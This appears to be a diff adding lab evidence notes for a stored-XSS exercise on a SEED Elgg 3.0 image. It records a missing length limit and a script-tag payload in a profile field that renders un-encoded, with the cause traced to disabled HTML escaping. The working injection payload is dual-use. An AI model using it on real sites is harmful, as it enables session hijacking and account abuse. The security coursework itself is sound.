@@ -1,0 +1,18 @@
+# HTTP-level Stored-XSS evidence (samy's OWN account, harmless payload)
+# Captured: 2026-11-18T11:00:53+07:00
+# Lab: Elgg 3.0 SEED image, http://www.seed-server.com (10.9.0.5), samy guid=59
+
+## Finding 1 - No 250-char enforcement in this image
+A 300-character briefdescription was accepted and stored in full (edit returned HTTP 302;
+read-back length = 300 raw chars). The briefdescription <input> has NO maxlength attribute.
+=> The assignment's 250-char limit is a SPEC/stock-Elgg constraint, NOT enforced by this lab image.
+
+## Finding 2 - Stored XSS: value rendered WITHOUT HTML encoding
+Payload stored in briefdescription:
+  XSSLAB-POC<script src="http://localhost:8000/demo.js"></script>
+Rendered verbatim (un-encoded) in GET /profile/samy page body:
+  (context, 80 chars before / 40 after)
+  "><span class="elgg-profile-field-label">Brief description</span><span class="">XSSLAB-POC<script src="http://localhost:8000/demo.js"></script></span></div></div></div><div class="elg
+
+=> A real browser would fetch and execute http://localhost:8000/demo.js in the Elgg origin.
+=> Root cause: output/text.php echoes the value raw (htmlspecialchars commented out).
